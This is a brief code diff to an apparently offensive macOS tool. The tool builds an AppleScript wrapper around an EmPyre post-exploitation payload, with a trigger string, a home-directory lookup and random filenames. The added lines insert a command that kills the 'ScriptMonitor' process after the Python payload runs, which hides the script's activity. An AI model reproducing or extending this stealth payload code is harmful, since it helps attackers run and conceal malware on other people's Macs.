@@ -12,6 +12,9 @@ trigger = "n00py"
 #NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!
 payload =  '''
 '''
+#This makes the applescript kill itself after the python payload is executed
+payload += 'kill `ps -ax | grep \\"ScriptMonitor\\" |grep -v \\"grep\\" |  cut -d \\" \\" -f 1`"'
+
 #Gets the users current home directory
 home =  os.getenv("HOME")
 #Creates random filenames
